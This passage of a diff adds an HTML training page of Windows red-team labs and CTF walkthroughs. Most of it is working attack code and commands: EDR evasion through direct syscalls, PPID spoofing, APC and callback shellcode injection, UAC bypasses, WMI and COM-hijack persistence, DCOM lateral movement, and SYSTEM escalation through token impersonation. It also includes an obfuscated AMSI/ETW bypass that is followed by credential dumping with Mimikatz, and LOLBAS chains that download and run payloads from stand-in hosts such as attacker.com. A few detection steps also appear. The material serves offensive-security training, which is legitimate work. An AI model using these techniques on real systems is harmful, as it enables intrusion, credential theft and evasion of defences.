+            <li>Memory forensics: <code>volatility -f mem.raw windows.malfind</code></li>
+          </ul>
+          <p><strong>Extension:</strong> Add relocation support for payloads that can't load at their preferred base address.</p>
+        </div>
+      </div>
+
+      <!-- Lab 3 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 3: Direct Syscalls with Hell's Gate</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Implement Hell's Gate to dynamically resolve SSNs and inject shellcode without touching hooked ntdll functions.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Parse ntdll.dll export directory to find NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx</li>
+            <li>Implement SSN resolution by reading the <code>mov eax, SSN</code> pattern</li>
+            <li>Write MASM/inline assembly stubs for each syscall</li>
+            <li>Perform shellcode injection using only direct syscalls</li>
+            <li>Verify EDR hooks are bypassed: compare ntdll entry points (should have JMP if hooked)</li>
+          </ol>
+          <pre><code class="language-c">// Lab: Verify ntdll hooks exist
+void CheckHooks() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pNtAlloc = (BYTE*)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    
+    printf("NtAllocateVirtualMemory first bytes: ");
+    for (int i = 0; i < 16; i++) printf("%02X ", pNtAlloc[i]);
+    printf("\n");
+    
+    // If hooked: E9 xx xx xx xx (JMP rel32) or FF 25 (JMP [addr])
+    // If clean: 4C 8B D1 B8 xx xx 00 00 (mov r10,rcx; mov eax,SSN)
+    if (pNtAlloc[0] == 0xE9 || (pNtAlloc[0] == 0xFF && pNtAlloc[1] == 0x25)) {
+        printf("[!] HOOKED - EDR detected\n");
+    } else if (pNtAlloc[0] == 0x4C) {
+        printf("[+] Clean - no hooks\n");
+    }
+}</code></pre>
+          <p><strong>Extension:</strong> Implement Halo's Gate fallback for when the target function is hooked.</p>
+        </div>
+      </div>
+
+      <!-- Lab 4 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 4: PPID Spoofing + Blockdlls</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Spawn a process with spoofed parent PID and enable BlockDLLs policy to prevent non-Microsoft DLLs from loading (blocks EDR injection).</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Find explorer.exe PID to use as fake parent</li>
+            <li>Implement PPID spoofing with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</li>
+            <li>Add PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</li>
+            <li>Spawn cmd.exe or powershell.exe</li>
+            <li>Verify: Process Explorer shows explorer.exe as parent</li>
+            <li>Try to inject a non-MS DLL into the new process — it should fail</li>
+          </ol>
+          <pre><code class="language-c">// Combined PPID Spoof + BlockDLLs
+BOOL SpawnProtected(DWORD parentPid) {
+    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
+    
+    SIZE_T attrSize = 0;
+    InitializeProcThreadAttributeList(NULL, 2, 0, &attrSize); // 2 attributes
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList = HeapAlloc(GetProcessHeap(), 0, attrSize);
+    InitializeProcThreadAttributeList(attrList, 2, 0, &attrSize);
+    
+    // Attribute 1: PPID Spoof
+    UpdateProcThreadAttribute(attrList, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &hParent, sizeof(HANDLE), NULL, NULL);
+    
+    // Attribute 2: Block non-Microsoft DLLs
+    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    UpdateProcThreadAttribute(attrList, 0,
+        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+        &policy, sizeof(policy), NULL, NULL);
+    
+    STARTUPINFOEXA si = { 0 };
+    si.StartupInfo.cb = sizeof(si);
+    si.lpAttributeList = attrList;
+    
+    PROCESS_INFORMATION pi;
+    CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
+        NULL, NULL, &si.StartupInfo, &pi);
+    
+    return TRUE;
+}</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 5 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 5: UAC Bypass via Fodhelper</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Bypass UAC to obtain a high-integrity PowerShell session from a medium-integrity context.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Verify current integrity level: <code>whoami /groups | findstr Level</code> (should show Medium)</li>
+            <li>Run the fodhelper bypass PowerShell script from the notes</li>
+            <li>Verify the new shell is High integrity: <code>whoami /groups | findstr High</code></li>
+            <li>Cleanup registry keys</li>
+          </ol>
+          <h5>Monitoring:</h5>
+          <ul>
+            <li>Use ProcMon to observe fodhelper.exe reading HKCU\Software\Classes\ms-settings</li>
+            <li>Set Sysmon to capture registry operations (Event ID 12/13/14)</li>
+            <li>Check Windows Event Log: Event ID 4688 shows process creation with elevated token</li>
+          </ul>
+          <p><strong>Extension:</strong> Write a C program that performs the same bypass without PowerShell (using RegCreateKeyEx/RegSetValueEx).</p>
+        </div>
+      </div>
+
+      <!-- Lab 6 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 6: WMI Persistence via Event Subscription</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Establish persistent code execution through WMI event subscriptions that survive reboots.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Create an EventFilter triggered every 60 seconds: <code>SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'</code></li>
+            <li>Create a CommandLineEventConsumer that runs your payload</li>
+            <li>Bind them together</li>
+            <li>Reboot the machine</li>
+            <li>Verify payload executes after reboot (check listener)</li>
+            <li>Practice detection: enumerate all WMI subscriptions</li>
+          </ol>
+          <pre><code class="language-powershell"># Enumerate WMI persistence (detection)
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
+    Select-Object Name, Query | Format-List
+Get-WmiObject -Namespace root\subscription -Class __EventConsumer |
+    Select-Object Name, CommandLineTemplate | Format-List
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
+    Select-Object Filter, Consumer | Format-List</code></pre>
+          <p><strong>Extension:</strong> Create a subscription that triggers only when a specific user logs in (WQL filtering on Win32_LogonSession.LogonType and TargetInstance.Name).</p>
+        </div>
+      </div>
+
+      <!-- Lab 7 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 7: DCOM Lateral Movement</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Execute commands on a remote machine using DCOM objects (no psexec, no WinRM).</p>
+          <h5>Setup:</h5>
+          <ul>
+            <li>Two Windows machines in same domain (or with local admin credentials)</li>
+            <li>Ensure DCOM is enabled (default) and firewall allows RPC</li>
+          </ul>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Test MMC20.Application: <code>[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))</code></li>
+            <li>Execute command via ExecuteShellCommand method</li>
+            <li>Test ShellWindows object for alternative execution</li>
+            <li>Try ShellBrowserWindow variant</li>
+            <li>Monitor target: check process creation events (parent will be mmc.exe, explorer.exe, or svchost.exe depending on COM object)</li>
+          </ol>
+          <p><strong>Detection:</strong> Look for DcomLaunch service spawning unexpected child processes, network connections on RPC dynamic ports (49152+).</p>
+        </div>
+      </div>
+
+      <!-- Lab 8 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 8: Token Impersonation with PrintSpoofer</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Escalate from a service account (IIS AppPool / SQL Server) with SeImpersonatePrivilege to SYSTEM.</p>
+          <h5>Setup:</h5>
+          <ul>
+            <li>Install IIS on a Windows Server VM</li>
+            <li>Deploy a webshell or get RCE as the IIS AppPool identity</li>
+            <li>Verify: <code>whoami /priv</code> shows SeImpersonatePrivilege</li>
+          </ul>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Upload PrintSpoofer64.exe to the target</li>
+            <li>Execute: <code>PrintSpoofer64.exe -i -c "cmd /c whoami"</code></li>
+            <li>Confirm SYSTEM access</li>
+            <li>Get a full shell: <code>PrintSpoofer64.exe -i -c "powershell -ep bypass"</code></li>
+            <li>Repeat with GodPotato for comparison</li>
+          </ol>
+          <h5>Understanding the Attack:</h5>
+          <pre><code class="language-c">// Simplified PrintSpoofer concept:
+// 1. Create a named pipe: \\.\pipe\test\pipe\spoolss
+// 2. Trigger SpoolSS to connect (it authenticates as SYSTEM)
+// 3. ImpersonateNamedPipeClient() on the connection
+// 4. Now running with SYSTEM token → CreateProcessWithTokenW</code></pre>
+          <p><strong>Extension:</strong> Write your own named pipe impersonation tool from scratch using the concepts in the notes section.</p>
+        </div>
+      </div>
+
+      <!-- Lab 9 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 9: COM Hijacking for Persistence</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Establish persistence by hijacking a COM object that explorer.exe loads at startup.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Use ProcMon to find COM objects loaded by explorer.exe that query HKCU first (result: NAME NOT FOUND)</li>
+            <li>Filter: Operation=RegOpenKey, Path contains HKCU\Software\Classes\CLSID, Result=NAME NOT FOUND</li>
+            <li>Select a CLSID that explorer queries frequently</li>
+            <li>Create the HKCU override pointing to your malicious DLL</li>
+            <li>Log off and back on (or kill/restart explorer)</li>
+            <li>Verify your DLL is loaded (Process Explorer → explorer.exe → DLLs tab)</li>
+          </ol>
+          <pre><code class="language-powershell"># Find hijackable CLSIDs (check what explorer looks for in HKCU)
+# Use this ProcMon filter in CLI form:
+# Process Name = explorer.exe
+# Operation = RegOpenKey  
+# Path contains HKCU\Software\Classes\CLSID
+# Result = NAME NOT FOUND
+
+# Common hijackable CLSIDs (verify on your build):
+# {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} - Task Scheduler
+# {BCDE0395-E52F-467C-8E3D-C4579291692E} - MMDeviceEnumerator</code></pre>
+          <p><strong>Extension:</strong> Create a DLL that only executes payload on first load (create mutex), avoids popping multiple times.</p>
+        </div>
+      </div>
+
+      <!-- Lab 10 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 10: LOLBAS Execution Chain</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Download and execute a payload using only built-in Windows binaries (no PowerShell, no cmd direct exec).</p>
+          <h5>Challenge Constraints:</h5>
+          <ul>
+            <li>PowerShell is blocked (AppLocker/Constrained Language Mode)</li>
+            <li>cmd.exe is blocked</li>
+            <li>Only signed Microsoft binaries can execute</li>
+          </ul>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Host payload on attacker web server (MSBuild .csproj file)</li>
+            <li>Download via certutil: <code>certutil -urlcache -split -f http://attacker/payload.csproj C:\Users\Public\p.csproj</code></li>
+            <li>Execute via MSBuild: <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\p.csproj</code></li>
+            <li>Alternative chain: bitsadmin download → InstallUtil.exe execute</li>
+            <li>Alternative chain: mshta.exe with inline VBScript → write to disk → forfiles /c to execute</li>
+          </ol>
+          <pre><code class="language-powershell"># Alternative LOLBAS chains when PowerShell/cmd are blocked:
+
+# Chain 1: certutil + MSBuild
+certutil -urlcache -split -f http://attacker.com/payload.csproj %TEMP%\p.csproj
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\p.csproj
+
+# Chain 2: bitsadmin + InstallUtil  
+bitsadmin /transfer j /download /priority high http://attacker.com/payload.exe %TEMP%\p.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\p.exe
+
+# Chain 3: mshta inline → wmic XSL
+mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('calc.exe');close();"
+
+# Chain 4: regsvr32 squiblydoo (network-based, fileless)
+regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 11 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 11: APC Injection (Early Bird)</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Inject shellcode via Early Bird APC injection into a freshly created process before any EDR hooks are initialized.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Generate shellcode (calc.exe popup or reverse shell)</li>
+            <li>Implement Early Bird APC from the notes section</li>
+            <li>Target: <code>C:\Windows\System32\RuntimeBroker.exe</code> (benign-looking process)</li>
+            <li>Compile and run</li>
+            <li>Verify shellcode executes in the context of RuntimeBroker</li>
+            <li>Monitor with Sysmon: check for Event ID 10 (Process Access) and correlate with the suspended process creation</li>
+          </ol>
+          <h5>Why Early Bird works:</h5>
+          <p>The APC is queued before the process's main thread starts executing. When the thread resumes, it enters an alertable wait state during <code>ntdll!LdrInitializeThunk</code> (loader initialization), causing the APC to fire before any usermode hooks are applied by EDR's injected DLL.</p>
+          <pre><code class="language-c">// Verify APC fired before EDR hooks
+// In your shellcode, check if EDR DLLs are loaded:
+HMODULE hEDR = GetModuleHandleA("CrowdStrike_DLL_Name.dll");
+if (hEDR == NULL) {
+    // SUCCESS: Our code ran before EDR loaded
+    // EDR's DLL hasn't been injected yet
+}</code></pre>
+          <p><strong>Extension:</strong> Chain with PPID spoofing so the created process appears to be spawned by a trusted parent.</p>
+        </div>
+      </div>
+
+      <!-- Lab 12 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 12: AMSI/ETW Bypass + PowerShell Payload</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Patch AMSI and ETW in a PowerShell session, then run a detected tool (Mimikatz/Rubeus) without triggering alerts.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Open PowerShell, verify AMSI blocks Mimikatz: <code>IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')</code> → should be blocked</li>
+            <li>Apply AMSI bypass (from notes)</li>
+            <li>Retry Mimikatz download → should succeed</li>
+            <li>Apply ETW patch to prevent telemetry</li>
+            <li>Run Invoke-Mimikatz and verify no alerts fire</li>
+          </ol>
+          <pre><code class="language-powershell"># Step 1: Verify AMSI is active
+"amsiutils" # This alone may trigger
+
+# Step 2: AMSI Bypass (obfuscated to avoid static detection)
+$w = 'System.Management.Automation.A]m]s]i]U]t]i]l]s' -replace ']',''
+$d = [Ref].Assembly.GetType($w)
+$f = $d.GetField('a]m]s]i]I]n]i]t]F]a]i]l]e]d' -replace ']','','NonPublic,Static')
+$f.SetValue($null,$true)
+
+# Step 3: ETW Bypass
+$etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+$etwField = $etw.GetField('etwProvider','NonPublic,Static')  
+$etwProvider = $etwField.GetValue($null)
+# Disable the provider
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)
+
+# Step 4: Now run detected tools freely
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds</code></pre>
+          <p><strong>Extension:</strong> Write a C# assembly that patches AMSI in the current process's amsi.dll directly (in-memory patching of AmsiScanBuffer).</p>
+        </div>
+      </div>
+
+      <!-- Lab 13 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 13: Callback-Based Shellcode Execution</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Execute shellcode using obscure Windows API callback functions to avoid CreateThread-based detection.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Allocate RWX memory and copy shellcode (calc.exe popup)</li>
+            <li>Execute using 5 different callback methods</li>
+            <li>Compare which ones trigger your AV/EDR</li>
+            <li>Monitor with API Monitor to understand the call chain</li>
+          </ol>
+          <pre><code class="language-c">// Test harness: try multiple callback methods
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+
+void ExecuteViaCallbacks(LPVOID scAddr) {
+    printf("[*] Testing callback execution methods...\n");
+    
+    // Method 1: EnumFonts
+    printf("[1] EnumFonts... ");
+    HDC hdc = GetDC(NULL);
+    EnumFonts(hdc, NULL, (FONTENUMPROC)scAddr, 0);
+    ReleaseDC(NULL, hdc);
+    printf("Done\n");
+    
+    // Method 2: CreateTimerQueueTimer
+    printf("[2] CreateTimerQueueTimer... ");
+    HANDLE hTimer, hQueue = CreateTimerQueue();
+    CreateTimerQueueTimer(&hTimer, hQueue,
+        (WAITORTIMERCALLBACK)scAddr, NULL, 0, 0, 0);
+    Sleep(500);
+    printf("Done\n");
+    
+    // Method 3: CertEnumSystemStore
+    printf("[3] CertEnumSystemStore... ");
+    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL,
+        (PFN_CERT_ENUM_SYSTEM_STORE)scAddr);
+    printf("Done\n");
+    
+    // Method 4: Fiber
+    printf("[4] Fiber execution... ");
+    ConvertThreadToFiber(NULL);
+    LPVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
+    SwitchToFiber(scFiber);
+    printf("Done\n");
+    
+    // Method 5: EnumDesktops
+    printf("[5] EnumDesktops... ");
+    EnumDesktopsW(GetProcessWindowStation(),
+        (DESKTOPENUMPROCW)scAddr, 0);
+    printf("Done\n");
+}</code></pre>
+          <p><strong>Extension:</strong> Find 3 additional undocumented callback APIs by searching ntdll/kernel32 exports that accept function pointers.</p>
+        </div>
+      </div>
+
+      <!-- Lab 14 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 14: Named Pipe Impersonation (Custom Potato)</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Build a minimal named pipe impersonation tool from scratch that escalates to SYSTEM when a privileged service connects.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Create a named pipe server (<code>\\.\pipe\customPotato</code>)</li>
+            <li>Wait for connections with ConnectNamedPipe</li>
+            <li>When a client connects, call ImpersonateNamedPipeClient</li>
+            <li>Open the impersonated thread token and duplicate it</li>
+            <li>Spawn a SYSTEM shell using CreateProcessWithTokenW</li>
+            <li>Test by manually connecting from a SYSTEM context first (verify it works)</li>
+            <li>Then try coercing a SYSTEM service to connect (SpoolSample)</li>
+          </ol>
+          <pre><code class="language-c">// Minimal custom Potato implementation
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    printf("[*] Creating named pipe...\n");
+    HANDLE hPipe = CreateNamedPipeW(
+        L"\\\\.\\pipe\\customPotato\\pipe\\spoolss",
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_WAIT,
+        10, 2048, 2048, 0, NULL);
+    
+    printf("[*] Waiting for SYSTEM connection...\n");
+    ConnectNamedPipe(hPipe, NULL);
+    printf("[+] Client connected!\n");
+    
+    // Impersonate
+    if (!ImpersonateNamedPipeClient(hPipe)) {
+        printf("[-] Impersonation failed: %d\n", GetLastError());
+        return 1;
+    }
+    
+    // Get impersonated token
+    HANDLE hToken;
+    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
+    
+    // Duplicate as primary token
+    HANDLE hPrimary;
+    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+        SecurityImpersonation, TokenPrimary, &hPrimary);
+    
+    // Spawn SYSTEM shell
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.lpDesktop = L"WinSta0\\Default";
+    
+    CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE,
+        L"C:\\Windows\\System32\\cmd.exe", NULL,
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    
+    printf("[+] Spawned SYSTEM shell (PID: %d)\n", pi.dwProcessId);
+    
+    RevertToSelf();
+    CloseHandle(hPipe);
+    return 0;
+}</code></pre>
+        </div>
+      </div>
+
+    </div><!-- end labs tab -->
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- CTF TAB -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="tab-pane fade" id="ctf" role="tabpanel" aria-labelledby="ctf-tab">
+
+      <h2>CTF Challenges</h2>
+
+      <!-- CTF 1 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 1: Injection Detective</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Process Injection / Forensics</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Description:</strong> A memory dump is provided from a compromised system. A malicious actor injected code into a legitimate process. Identify: (1) the injection technique used, (2) the target process PID, (3) the injected shellcode's C2 address.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-bash"># Volatility3 analysis
+python3 vol.py -f challenge.raw windows.malfind
+# Look for: PAGE_EXECUTE_READWRITE regions with MZ header or shellcode patterns
+
+python3 vol.py -f challenge.raw windows.hollowprocesses
+# Detects: image mismatch between disk and memory (process hollowing)
+
+python3 vol.py -f challenge.raw windows.threads
+# Check: thread start addresses outside of any known module → injected code
+
+# Extract injected code
+python3 vol.py -f challenge.raw windows.malfind --dump
+# Analyze with: strings, disassembler, YARA rules</code></pre>
+          <h5>Flag Format:</h5> <code>FLAG{technique_pid_c2ip}</code>
+          <p><strong>Key Indicators:</strong></p>
+          <ul>
+            <li>Process Hollowing: IMAGE_DOS_HEADER at base of VAD with different name than process</li>
+            <li>Classic injection: RWX page in process that doesn't own it</li>
+            <li>Thread hijacking: thread start address in unbacked (anonymous) memory</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- CTF 2 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 2: UAC Escape Room</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Privilege Escalation</p>
+          <p><strong>Difficulty:</strong> Easy-Medium</p>
+          <p><strong>Description:</strong> You have a medium-integrity shell on a Windows 10 machine. The user is a local administrator. UAC is set to "Always Notify." PowerShell is in Constrained Language Mode. Find a way to get a high-integrity shell and read <code>C:\flag.txt</code> (only readable by High integrity processes).</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-powershell"># Since PowerShell is in CLM, we need a bypass
+# Option 1: Use a compiled C# tool (not affected by CLM)
+# Option 2: Use LOLBAS binaries
+
+# Check what's available:
+where.exe fodhelper.exe
+where.exe eventvwr.exe
+where.exe computerdefaults.exe
+
+# Since UAC = "Always Notify", standard fodhelper won't work silently
+# But we can try: DiskCleanup/SilentCleanup (task runs with highest privs)
+# OR: CMSTPLUA COM object (works even with Always Notify on some builds)
+
+# Using cmstp.exe bypass:
+# 1. Create INF file
+$inf = @"
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,http://attacker/payload.sct
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Bypass"
+ShortSvcName="Bypass"
+"@
+$inf | Out-File C:\Users\Public\bypass.inf
+
+# 2. Execute (pops UAC prompt but auto-dismisses with certain flags)
+cmstp.exe /s /ns C:\Users\Public\bypass.inf</code></pre>
+          <p><strong>Flag:</strong> Contents of C:\flag.txt after obtaining High integrity.</p>
+        </div>
+      </div>
+
+      <!-- CTF 3 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 3: Potato Farm</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Token Manipulation / Privilege Escalation</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Description:</strong> You have a webshell running as <code>IIS APPPOOL\DefaultAppPool</code>. The system is Windows Server 2019 (JuicyPotato patched). Escalate to SYSTEM and read the flag at <code>C:\Windows\flag.txt</code>.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-powershell"># Step 1: Check privileges
+whoami /priv
+# SeImpersonatePrivilege = Enabled ← this is our ticket
+
+# Step 2: JuicyPotato doesn't work on Server 2019+
+# Options: PrintSpoofer, RoguePotato, GodPotato
+
+# Step 3: Check if Print Spooler is running
+sc query spooler
+# If running → PrintSpoofer works
+
+# Step 4: Upload and run PrintSpoofer
+certutil -urlcache -split -f http://attacker/PrintSpoofer64.exe C:\Users\Public\ps.exe
+C:\Users\Public\ps.exe -i -c "cmd /c type C:\Windows\flag.txt"
+
+# If Spooler is stopped, try GodPotato:
+C:\Users\Public\GodPotato.exe -cmd "cmd /c type C:\Windows\flag.txt"
+
+# If .NET isn't available for GodPotato, try RoguePotato
+# (requires a remote machine for OXID redirect)
+socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999 &  # on attacker
+C:\Users\Public\RoguePotato.exe -r ATTACKER_IP -e "cmd /c type C:\Windows\flag.txt" -l 9999</code></pre>
+          <p><strong>Flag:</strong> <code>FLAG{potato_SYSTEM_pwned}</code></p>
+        </div>
+      </div>
+
+      <!-- CTF 4 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 4: Living Off The Land</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Defense Evasion / Execution</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Description:</strong> AppLocker is enforcing a strict whitelist: only executables in <code>C:\Windows\</code> and <code>C:\Program Files\</code> can run. PowerShell is blocked entirely. Download a file from <code>http://challenge-server/payload</code> and execute it. The payload prints the flag.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-bash"># AppLocker blocks custom EXEs but not all Microsoft-signed binaries
+
+# Download using whitelisted binary:
+certutil -urlcache -split -f http://challenge-server/payload C:\Users\Public\payload.b64
+
+# If payload is a .NET assembly, use InstallUtil:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\payload.exe
+
+# If payload is C# source/project, use MSBuild:
+certutil -urlcache -split -f http://challenge-server/payload.csproj C:\Users\Public\p.csproj
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\p.csproj
+
+# If payload is a DLL:
+rundll32.exe C:\Users\Public\payload.dll,EntryPoint
+
+# If payload is script-based (SCT):
+regsvr32 /s /n /u /i:http://challenge-server/payload.sct scrobj.dll
+
+# If payload needs to run as HTA:
+mshta http://challenge-server/payload.hta</code></pre>
+          <p><strong>Key insight:</strong> AppLocker whitelists are bypassable using Microsoft-signed LOLBINs as proxy execution vehicles.</p>
+        </div>
+      </div>
+
+      <!-- CTF 5 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 5: Ghost in the Machine</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Process Injection / Evasion</p>
+          <p><strong>Difficulty:</strong> Hard</p>
+          <p><strong>Description:</strong> An EDR is running that detects: CreateRemoteThread, NtMapViewOfSection cross-process, and VirtualAllocEx with PAGE_EXECUTE. Get your shellcode running in explorer.exe without triggering any alerts. The EDR logs are accessible at <code>C:\EDR\alerts.log</code> — it must remain empty.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-c">// Strategy: Module Stomping + Direct Syscalls + Callback execution
+// 1. Use direct syscalls to avoid hooked ntdll functions
+// 2. Load a sacrificial DLL into explorer (legitimate operation)
+// 3. Overwrite its .text section (no VirtualAllocEx needed)
+// 4. Trigger via callback (no CreateRemoteThread)
+
+// Step 1: Find a DLL already loaded in explorer that we can overwrite
+// Target: a rarely-used DLL with a large .text section
+// e.g., msfte.dll, chakra.dll, or any large unused DLL
+
+// Step 2: Direct syscall to NtWriteVirtualMemory (bypass hook)
+// Use Hell's Gate to resolve SSN dynamically
+
+// Step 3: Write shellcode over the .text section
+// This looks like legitimate memory modification within a known module
+
+// Step 4: Execute via QueueUserAPC targeting an alertable thread
+// OR: modify a function pointer in a callback table within the DLL
+// OR: use NtQueueApcThreadEx2 (newer, less monitored)
+
+// The key insight: if code executes from within a legitimate DLL's
+// address range, many EDRs won't flag it as suspicious</code></pre>
+          <p><strong>Flag:</strong> Shellcode writes flag to <code>C:\Users\Public\flag.txt</code> — must be written without triggering alerts.</p>
+        </div>
+      </div>
+
+      <!-- CTF 6 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Challenge 6: WMI Persistence Hunt</h4></div>
+        <div class="card-body">
+          <p><strong>Category:</strong> Forensics / Persistence Detection</p>
+          <p><strong>Difficulty:</strong> Medium</p>
+          <p><strong>Description:</strong> A system has been backdoored with WMI event subscriptions. Find all persistence mechanisms: (1) the trigger condition, (2) the executed command, (3) the encoded flag hidden in the WQL query comment.</p>
+          <h5>Approach:</h5>
+          <pre><code class="language-powershell"># Enumerate all WMI subscriptions
+Get-WmiObject -Namespace root\subscription -Class __EventFilter |
+    Format-List Name, Query, QueryLanguage
+
+Get-WmiObject -Namespace root\subscription -Class __EventConsumer |
+    Format-List Name, CommandLineTemplate, ScriptText
+
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
+    Format-List *
+
+# Check MOF files for persistence
+Get-ChildItem C:\Windows\System32\wbem\*.mof -Recurse | 
+    Select-String -Pattern "CommandLineEventConsumer|ActiveScriptEventConsumer"
+
+# Parse the CIM repository directly (if subscriptions are hidden)
+# Location: C:\Windows\System32\wbem\Repository\OBJECTS.DATA
+strings C:\Windows\System32\wbem\Repository\OBJECTS.DATA | findstr /i "flag{"
+
+# Check for WMI provider DLLs that may be malicious
